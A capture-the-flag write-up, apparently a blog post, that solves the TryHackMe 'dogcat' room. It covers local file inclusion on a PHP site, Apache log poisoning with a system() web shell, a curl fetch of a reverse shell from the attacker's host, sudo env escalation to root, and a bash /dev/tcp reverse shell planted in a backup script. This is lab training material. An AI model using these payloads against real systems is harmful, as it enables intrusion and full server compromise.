---
layout: post
title:  "TryHackMe dogcat writeup"
date:   2020-10-08 12:59:36 +0200
categories: writeup tryhackme
---

> I made this website for viewing cat and dog images with PHP. If you’re feeling down, come look at some dogs/cats!

## Exploiting a PHP Web server

This [TryHackMe room](https://tryhackme.com/room/dogcat) is about exploiting a PHP server. The goal is to find four flags. There are no more instructions provided in the room description. The web application is a simple one pager where you can click to see dog or cat pictures. No JavaScript, just PHP generated HTML and some images.

NOTE: It took me a while to hack this box so that’s why there are several target IP addresses in the commands. A couple times I messed up and had to reset the box to be able to continue. Can’t do that in real life so it’s really valuable to have these training boxes.

![web]({{ site_url}}/assets/dogcat/web.png)

## Reconnaissance

Let’s start with a nmap scan:

```
$ nmap -sC -sV — script=vulners 10.10.116.148 
Starting Nmap 7.80 ( https://nmap.org ) at 2020–10–07 18:20 EEST
Nmap scan report for 10.10.116.148
Host is up (0.052s latency).
Not shown: 998 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| vulners: 
| cpe:/a:openbsd:openssh:7.6p1: 
| CVE-2008–3844 9.3 https://vulners.com/cve/CVE-2008-3844
...
80/tcp open http Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| vulners: 
| cpe:/a:apache:http_server:2.4.38: 
| CVE-2010–0425 10.0 https://vulners.com/cve/CVE-2010-0425
| CVE-1999–1412 10.0 https://vulners.com/cve/CVE-1999-1412
| CVE-1999–1237 10.0 https://vulners.com/cve/CVE-1999-1237
| CVE-1999–0236 10.0 https://vulners.com/cve/CVE-1999-0236
.....
|_ CVE-2001–0131 1.2 https://vulners.com/cve/CVE-2001-0131
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
any interesting directories?

```
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.116.148 dir
```
reveals nothing of interest. Let’s try with .php extension:

```
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -u http://10.10.116.148 dir
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url: http://10.10.116.148
[+] Threads: 10
[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes: 200,204,301,302,307,401,403
[+] User Agent: gobuster/3.0.1
[+] Extensions: php
[+] Timeout: 10s
===============================================================
2020/10/07 18:33:18 Starting gobuster
===============================================================
/index.php (Status: 200)
/cat.php (Status: 200)
/flag.php (Status: 200)
/cats (Status: 301)
/dogs (Status: 301)
/dog.php (Status: 200)
===============================================================
2020/10/07 18:48:30 Finished
```
One interesting file `flag.php` found. Let’s get back to that later.

## Enumeration of HTTP parameters
Web application sends picture requests in the following URL format:

```
http://10.10.116.148/?view=cat
```
Let’s try to see if some sort of injection attack is possible:
```
http://10.10.116.148/?view=dog”
```
Bingo! The server is vulnerable to LFI.
![web]({{ site_url}}/assets/dogcat/phperror.png)

The error message points to use of PHP `include()` function, which includes and evaluates a PHP file. Maybe it could be hacked to include something else? Looking for guidance from an excellent resource [Total OCSP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.htm) we learn that we can exploit this unsanitized input to include files from the server. Let’s try to get the index.php:

```
http://10.10.141.46/?view=dog/../index
```
Doesn’t work because of double inclusion of .php extension. So we need to figure out how to bypass .php file extension and dump PHP files on the server. Again the guide helps us:

```
http://10.10.141.46/?view=php://filter/convert.base64-encode/resource=dog/../index
```

This gives us a base64 encoded index.html which contains the following PHP code:

```php
<?php
function containsStr($str, $substr)
{
    return strpos($str, $substr) !== false;
}
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
if (isset($_GET['view']))
{
    if (containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat'))
    {
        echo 'Here you go!';
        include $_GET['view'] . $ext;
    }
    else
    {
        echo 'Sorry, only dogs or cats are allowed.';
    }
}
?>
```
We notice that ext can be set as a URL parameter and if it is present it is used as such so it can be set to empty value. Also dog or cat is checked with containsStr() which can include anything else too. Let’s try to get the flag.php we found earlier with gobuster:

```
http://10.10.141.46/?view=php://filter/convert.base64-encode/resource=dog/../flag
```
It works! Base64 decode gives flag1:
```
<?php
$flag_1 = “THM{__REDACTED__}”
?>
```
## Apache log poisoning

Since we can now view files on the target system one potential exploit is to inject PHP code into some file that we can display on the web app. Total OCSP Guide has guidance on this too. One potential target is Apache web log which logs our requests along with the user agent:

```
http://10.10.141.46/view=dog/../../../../../var/log/apache2/access.log&ext=
```
looking at the log from page source view we can see that user agent strings are not HTTP escaped so we can inject PHP code there. A good payload includes a command to execute on the server based on URL parameters. Using it we can execute commands by simply modifying the URL that we send to the server:

```
<?php system((isset($_GET['c']))?$_GET['c']:'echo'); ?>
```
Let’s make a simple request with it as user-agent:

```
curl -A “<?php system((isset(\$_GET[‘c’]))?\$_GET[‘c’]:’echo’); ?>” http://10.10.141.46/?view=dog
```
testing with

```
http://10.10.141.46/?view=dog/../../../../../var/log/apache2/access.log&ext=&c=uname
```
shows that it works. Let’s use pentestmonkey php shell, modify local host parameters, rename it to something less suspicious, serve it using python -m SimpleHTTPServer` and upload it to /var/www/html:

```
http://10.10.161.6/?view=dog/../../../../../var/log/apache2/access.log&ext=&c=curl%20http://10.8.108.247:8000/status.php%20-o%20status.php
```
start up a listener `nc -nlp 4444` and navigate to the page.

## We have shell

Check privilege escalation with sudo:

```
User www-data may run the following commands on ac997f808290:
 (root) NOPASSWD: /usr/bin/env
```

Our trusty friend GTFOBins tells us what to do:

```
$ sudo /usr/bin/env /bin/sh
whoami
root
```
get the root flag:
```
cd /root
ls
flag3.txt
cat flag3.txt
THM{__REDACTED__}
```
Now need to figure where the other two flags are.

```
find / -iname “*flag*”
...
cd /var/www
ls
flag2_QMW7JvaY2LvK.txt
html
cat flag2_QMW7JvaY2LvK.txt
THM{__REDACTED__}
```

One more to go. Where could it be?Looking around file system: some other application, no. mail, no. databases, no. backups, yes:

```
find / -iname “*backup*”
/opt/backups
/opt/backups/backup.tar
/opt/backups/backup.sh
cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```
Ok, this must be a Docker directory that is mounted to Docker machine. If the backup.sh is run in the Docker machine we might be able to run something there. Come to think of it, the flag2 does point to RCE… Lets try with Pentestmonkey reverse bash shell:

```
cat > backup.sh
#!/bin/bash
bash -i >& /dev/tcp/10.8.108.247/5555 0>&1
```
Boom!
```
root@dogcat:~# cat flag4.txt
cat flag4.txt
THM{__REDACTED__}
root@dogcat:~#
```

